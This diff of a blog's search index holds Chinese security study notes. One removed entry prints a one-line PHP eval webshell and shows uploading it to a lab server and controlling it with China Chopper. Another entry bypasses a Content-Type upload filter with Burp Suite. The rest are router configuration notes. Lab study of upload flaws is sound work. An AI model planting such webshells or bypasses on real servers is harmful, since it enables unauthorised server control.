-<li><p>php的一句话是：<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p>
-</li>
-</ul>
-<p>过程：</p>
-<ul>
-<li><p>打开火狐，<a href="http://192.168.1.3:8080/up%EF%BC%8C%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BB%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC![image-20211228105130236](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)">http://192.168.1.3:8080/up，打开文件上传漏洞演示脚本，点击中国菜刀连接一句话木马![image-20211228105130236](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)</a></p>
-</li>
-<li><p>点击浏览，上传php文件，木马地址为<a href="http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)">http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)</a></p>
-</li>
-<li><p>打开中国菜刀</p>
-</li>
-<li><p>添加木马地址，密码为lubr，脚本类型php(eval)<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105329855.png" alt="image-20211228105329855"></p>
-</li>
-<li><p>添加到主界面<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105353101.png" alt="image-20211228105353101"></p>
-</li>
-<li><p>右键文件管理，即可查看目标服务器的完整目录，也可进行创建文件，修改文件，修改和下载等相关操作<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105418680.png" alt="image-20211228105418680"></p>
-</li>
-<li><p>右键单击浏览网站，即可实现浏览器功能，浏览该站点<img src="https://121.5.125.62:88/image/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105439630.png" alt="image-20211228105439630"></p>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>木马</tag>
-        <tag>一句话</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>南方企业内容管理系统漏洞</title>
     <url>/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p>目的：</p>
@@ -1314,6 +1432,48 @@
 ]]></content>
   </entry>
   <entry>
+    <title>绕过content_type检测文件类型上传webshell</title>
+    <url>/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
+    <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
+<ul>
+<li>理解绕过Content-Type检测文件类型上传的原理</li>
+<li>学习绕过Content-Type检测文件类型上传的过程</li>
+</ul>
+<p>原理:</p>
+<ul>
+<li>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</li>
+<li>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</li>
+</ul>
+<p>过程：</p>
+<ul>
+<li><p>打开火狐浏览器，修改代理127.0.0.1:8080<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103046467.png" alt="image-20211228103046467"></p>
+</li>
+<li><p>打开burp，点击intercept is off<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103152265.png" alt="image-20211228103152265"></p>
+</li>
+<li><p>打开浏览器,输入<a href="http://192.168.1.3:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BBcontent_type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell%E3%80%82![image-20211228103256712](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)">http://192.168.1.3:8080/up,进入文件上传漏洞演示脚本，点击content_type检测文件类型上传webshell。![image-20211228103256712](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)</a></p>
+</li>
+<li><p>上传php文件，前台显示错误窗口<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103342121.png" alt="image-20211228103342121"></p>
+</li>
+<li><p>Burp开启抓包</p>
+</li>
+<li><p>Burp抓到的数据包,在数据包中的content-type的application-stream修改为image/gif<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103504817.png" alt="image-20211228103504817"></p>
+</li>
+<li><p>点击forward，发送数据包，前台提示上传lubr.php成功<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103538500.png" alt="image-20211228103538500"></p>
+</li>
+<li><p>浏览器输入地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA![image-20211228103621026](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)">http://192.168.1.3:8080/up/uploads/lubr.php，页面没有错误提示![image-20211228103621026](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)</a></p>
+</li>
+<li><p>打开中国菜刀，添加木马地址，密码，lubr，脚本类型php(eval)，点击添加<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103730160.png" alt="image-20211228103730160"></p>
+</li>
+<li><p>双击添加记录，可查看完整目录<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103747989.png" alt="image-20211228103747989"></p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+        <tag>content_type</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>绕过前台脚本检测扩展名上传webshell</title>
     <url>/2021/12/27/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<p>目的：</p>
@@ -1379,48 +1539,6 @@
       </tags>
   </entry>
   <entry>
-    <title>绕过content_type检测文件类型上传webshell</title>
-    <url>/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
-    <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
-<ul>
-<li>理解绕过Content-Type检测文件类型上传的原理</li>
-<li>学习绕过Content-Type检测文件类型上传的过程</li>
-</ul>
-<p>原理:</p>
-<ul>
-<li>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</li>
-<li>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</li>
-</ul>
-<p>过程：</p>
-<ul>
-<li><p>打开火狐浏览器，修改代理127.0.0.1:8080<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103046467.png" alt="image-20211228103046467"></p>
-</li>
-<li><p>打开burp，点击intercept is off<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103152265.png" alt="image-20211228103152265"></p>
-</li>
-<li><p>打开浏览器,输入<a href="http://192.168.1.3:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BBcontent_type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell%E3%80%82![image-20211228103256712](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)">http://192.168.1.3:8080/up,进入文件上传漏洞演示脚本，点击content_type检测文件类型上传webshell。![image-20211228103256712](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)</a></p>
-</li>
-<li><p>上传php文件，前台显示错误窗口<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103342121.png" alt="image-20211228103342121"></p>
-</li>
-<li><p>Burp开启抓包</p>
-</li>
-<li><p>Burp抓到的数据包,在数据包中的content-type的application-stream修改为image/gif<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103504817.png" alt="image-20211228103504817"></p>
-</li>
-<li><p>点击forward，发送数据包，前台提示上传lubr.php成功<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103538500.png" alt="image-20211228103538500"></p>
-</li>
-<li><p>浏览器输入地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA![image-20211228103621026](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)">http://192.168.1.3:8080/up/uploads/lubr.php，页面没有错误提示![image-20211228103621026](https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)</a></p>
-</li>
-<li><p>打开中国菜刀，添加木马地址，密码，lubr，脚本类型php(eval)，点击添加<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103730160.png" alt="image-20211228103730160"></p>
-</li>
-<li><p>双击添加记录，可查看完整目录<img src="https://121.5.125.62:88/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103747989.png" alt="image-20211228103747989"></p>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
-        <tag>content_type</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>进程间Messenger通信</title>
     <url>/2021/12/27/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/</url>
     <content><![CDATA[<h2 id="进程间Messenger通信"><a href="#进程间Messenger通信" class="headerlink" title="进程间Messenger通信"></a>进程间Messenger通信</h2><p>目的：</p>
@@ -1458,123 +1576,5 @@
         <tag>进程</tag>
         <tag>Messenger</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>ssh文件权限问题</title>
-    <url>/2022/03/06/ssh%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="ssh文件权限问题"><a href="#ssh文件权限问题" class="headerlink" title="ssh文件权限问题"></a>ssh文件权限问题</h2><h3 id="0x00-权限过高"><a href="#0x00-权限过高" class="headerlink" title="0x00 权限过高"></a>0x00 权限过高</h3><p>今天使用mobaxterm生成的公钥的上传到服务器，准备登陆时反馈信息，server refused our key，主要原因是~/.ssh文件夹权限过高导致的问题，authorized_keys文件我给的权限是644，.ssh文件夹我给的权限是755，最后使用密钥登录成功。</p>
-]]></content>
-      <tags>
-        <tag>-ssh -权限 -远程ssh连接</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>eNSP配置</title>
-    <url>/2022/07/26/eNSP%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="路由器设置ip"><a href="#路由器设置ip" class="headerlink" title="路由器设置ip"></a>路由器设置ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view           //进入系统视图</span><br><span class="line">[Huawei]display interface brief     //显示接口信息</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/0    //进入接口</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]ip address 192.168.1.254 24     //设置ip地址</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]q    //退出</span><br></pre></td></tr></table></figure>
-
-<h3 id="路由器设置console认证"><a href="#路由器设置console认证" class="headerlink" title="路由器设置console认证"></a>路由器设置console认证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">Enter system view, return user view with Ctrl+Z.</span><br><span class="line">[Huawei]aaa</span><br><span class="line">[Huawei-aaa]local-user ccc password cipher 123</span><br><span class="line">[Huawei-aaa]local-user ccc service-type terminal //设置ccc为终端用户</span><br><span class="line">[Huawei-aaa]q</span><br><span class="line">[Huawei]user-interface console 0  //进入console接口</span><br><span class="line">[Huawei-ui-console0]authentication-mode aaa  //验证模式改为aaa</span><br></pre></td></tr></table></figure>
-
-<h3 id="路由器设置telnet远程登录"><a href="#路由器设置telnet远程登录" class="headerlink" title="路由器设置telnet远程登录"></a>路由器设置telnet远程登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view</span><br><span class="line">[Huawei]aaa     //进入aaa视图</span><br><span class="line">[Huawei-aaa]local-user bbb password cipher 123    //创建用户bbb，设置密码为123</span><br><span class="line">[Huawei-aaa]local-user bbb privilege level 15     //设置用户权限为15</span><br><span class="line">[Huawei-aaa]local-user bbb service-type telnet    //设置用户服务类型telnet</span><br><span class="line">[Huawei-aaa]q             //退出</span><br><span class="line">[Huawei]user-interface vty 0 4      //设置5个人访问路由器</span><br><span class="line">[Huawei-ui-vty0-4]authentication-mode aaa</span><br></pre></td></tr></table></figure>
-<h3 id="路由器设置ssh远程登录"><a href="#路由器设置ssh远程登录" class="headerlink" title="路由器设置ssh远程登录"></a>路由器设置ssh远程登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---服务机</span><br><span class="line">[Huawei]stelnet server enable         //开启ssh服务，默认关闭</span><br><span class="line">[Huawei]rsa local-key-pair create     //创建rsa秘钥</span><br><span class="line">Input the bits in the modulus[default = 512]:1024</span><br><span class="line">[Huawei]aaa</span><br><span class="line">[Huawei-aaa]local-user ccc password cipher 123</span><br><span class="line">[Huawei-aaa]local-user ccc privilege level 15</span><br><span class="line">[Huawei-aaa]local-user ccc service-type ssh</span><br><span class="line">[Huawei-aaa]q</span><br><span class="line">[Huawei]user-interface vty 0 4</span><br><span class="line">[Huawei-ui-vty0-4]authentication-mode aaa</span><br><span class="line">[Huawei-ui-vty0-4]protocol inbound ssh   //开启vty线路的ssh访问功能</span><br><span class="line">[Huawei-ui-vty0-4]q</span><br><span class="line">[Huawei]ssh user ccc authentication-type all   //定义ssh的认证方式</span><br><span class="line">---客户机</span><br><span class="line">[Huawei]ssh client first-time enable    //第一次开启客户端</span><br><span class="line">[Huawei]stelnet 10.1.1.1</span><br></pre></td></tr></table></figure>
-<h3 id="设置空闲时间"><a href="#设置空闲时间" class="headerlink" title="设置空闲时间"></a>设置空闲时间</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view</span><br><span class="line">[Huawei]user-interface console 0         //进入console 0</span><br><span class="line">[Huawei-ui-console0]idle-timeout 10      //设置空闲时间10分钟</span><br></pre></td></tr></table></figure>
-<h3 id="设置ACL规则"><a href="#设置ACL规则" class="headerlink" title="设置ACL规则"></a>设置ACL规则</h3><ul>
-<li>高级ACL（简单）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]acl 3000            //进入高级acl设置，编号3000</span><br><span class="line">[Huawei-acl-adv-3000]rule 1 deny ip source 192.168.1.1 0 destination 172.20.1.1 0   //0为通配符掩码</span><br><span class="line">[Huawei-acl-adv-3000]q</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]traffic-filter inbound acl 3000  //绑定到接口0/0/0 入口方向</span><br></pre></td></tr></table></figure></li>
-<li>基本ACL<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]acl 2000            //基本ACL设置，编号2000</span><br><span class="line">[Huawei-acl-basic-2000]rule 1 deny source 192.168.1.2 0   //拒绝192.168.1.2流量</span><br><span class="line">[Huawei-acl-basic-2000]rule 2 permit source 192.168.1.1 0   //允许192.168.1.1流量</span><br><span class="line">[Huawei-acl-basic-2000]rule permit   //全部允许</span><br><span class="line">[Huawei-acl-basic-2000]q</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1]traffic-filter outbound acl  2000   //绑定到0/0/1的出口方向</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>eNSP</tag>
-        <tag>华为</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cisco配置</title>
-    <url>/2022/08/01/cisco%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="设置console密码"><a href="#设置console密码" class="headerlink" title="设置console密码"></a>设置console密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable                     //特权模式</span><br><span class="line">Router#configure terminal         //全局模式</span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line">Router(config)#line console 0     //进入0号控制台</span><br><span class="line">Router(config-line)#password 111  //设置密码111</span><br><span class="line">Router(config-line)#login         //开启密码</span><br></pre></td></tr></table></figure>
-<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/console%E5%AF%86%E7%A0%81.JPG" alt="console 密码"></p>
-<h3 id="设置特权模式密码"><a href="#设置特权模式密码" class="headerlink" title="设置特权模式密码"></a>设置特权模式密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line">Router(config)#enable password 111  //设置明文密码</span><br><span class="line">Router(config)#enable secret 222    //设置加密密码，会导致password失效</span><br><span class="line">Router(config)#login                //开启密码</span><br></pre></td></tr></table></figure>
-<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/%E7%89%B9%E6%9D%83%E5%AF%86%E7%A0%81.JPG" alt="特权密码"></p>
-<h3 id="设置远程登录telnet密码"><a href="#设置远程登录telnet密码" class="headerlink" title="设置远程登录telnet密码"></a>设置远程登录telnet密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#line vty 0 4         //设置0-4（共5个）用户可以进行Telnet登录</span><br><span class="line">Router(config-line)#password 111    //设置密码111</span><br><span class="line">Router(config-line)#login local     //开启密码</span><br></pre></td></tr></table></figure>
-<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/telnet%20%E5%AF%86%E7%A0%81.JPG" alt="telnet 密码"></p>
-<h3 id="设置远程登录telnet用户名和密码"><a href="#设置远程登录telnet用户名和密码" class="headerlink" title="设置远程登录telnet用户名和密码"></a>设置远程登录telnet用户名和密码</h3><ul>
-<li>登录权限为普通</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#username aaa password cisco   //非加密</span><br><span class="line">Router(config)#username aaa secret cisco     //加密</span><br><span class="line">Router(config)#line vty 0 4</span><br><span class="line">Router(config-line)#login  local</span><br></pre></td></tr></table></figure>
-<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/telnet%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90.JPG" alt="telnet-特权模式"></p>
-<h3 id="设置远程登录telnet用户名和密码（特权模式）"><a href="#设置远程登录telnet用户名和密码（特权模式）" class="headerlink" title="设置远程登录telnet用户名和密码（特权模式）"></a>设置远程登录telnet用户名和密码（特权模式）</h3><ul>
-<li>登录后为特权模式</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#username ddd privilege 15 secret ddd</span><br><span class="line">Router(config)#line vty 0 4</span><br><span class="line">Router(config-line)#login  local</span><br><span class="line">Router(config-line)#no password     //取消telnet远程登录</span><br><span class="line">Router(config-line)#no login        //不进行密码检查</span><br></pre></td></tr></table></figure>
-<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/telnet-user-password.JPG" alt="telnet-user-password"></p>
-<h3 id="登录超时自动断开"><a href="#登录超时自动断开" class="headerlink" title="登录超时自动断开"></a>登录超时自动断开</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#line vty 0 4</span><br><span class="line">Router(config-line)#exec-timeout 20 0    //20分钟0秒自动断开</span><br></pre></td></tr></table></figure>
-
-<h3 id="登录次数限制与时间锁定"><a href="#登录次数限制与时间锁定" class="headerlink" title="登录次数限制与时间锁定"></a>登录次数限制与时间锁定</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#login block-for 1800 attempts 10 within 600    //600秒内登录错误10次，锁定1800秒</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置ssh登录"><a href="#配置ssh登录" class="headerlink" title="配置ssh登录"></a>配置ssh登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#hostname router1  </span><br><span class="line">router1(config)#ip domain-name neoshi.net  //必须要先设置hostname和domain才能进行下一步</span><br><span class="line">router1(config)#crypto key generate rsa</span><br><span class="line">The name for the keys will be: router1.neoshi.net</span><br><span class="line">Choose the size of the key modulus in the range of 360 to 2048 for your</span><br><span class="line">  General Purpose Keys. Choosing a key modulus greater than 512 may take</span><br><span class="line">  a few minutes.</span><br><span class="line"></span><br><span class="line">How many bits in the modulus [512]: 1024    //生成1024rsa秘钥，支持360-2048</span><br><span class="line">% Generating 1024 bit RSA keys, keys will be non-exportable...[OK]</span><br><span class="line"></span><br><span class="line">Router(config)#username aaa secret aaa</span><br><span class="line">Router(config)#ip ssh authentication-retries 4   //设置ssh认证次数为4，可以为0-5之间</span><br><span class="line">router1(config)#line vty 0 4</span><br><span class="line">*3? 1 0:14:8.8:  %SSH-5-ENABLED: SSH 1.99 has been enabled</span><br><span class="line">router1(config-line)#login local</span><br><span class="line">router1(config-line)#transport input ssh     //设置登录模式为ssh，默认为all</span><br></pre></td></tr></table></figure>
-
